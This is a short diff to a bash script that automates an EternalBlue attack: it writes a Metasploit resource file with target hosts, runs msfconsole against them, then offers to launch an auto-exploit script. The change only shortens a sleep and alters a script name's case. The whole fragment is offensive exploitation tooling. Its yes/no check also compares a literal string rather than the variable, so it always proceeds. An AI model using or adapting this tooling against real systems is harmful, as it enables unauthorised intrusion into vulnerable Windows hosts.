@@ -15,11 +15,11 @@ echo "set rhosts" $rhost >> scan.rc
 echo "set CHECK_PIPE true" >> scan.rc
 echo "run" >> scan.rc
 xterm -e "msfconsole -r scan.rc"
-sleep 6
+sleep 2
 read -p 'Launch auto eternalblue?(Y/n)' answer
 if [[ ( answer=="Y" ) || ( answer=="y" ) ]]; then
 cd ..
-./eternalblue auto.sh
+./Eternalblue auto.sh
 else
 echo "Goodbye :)"
 fi
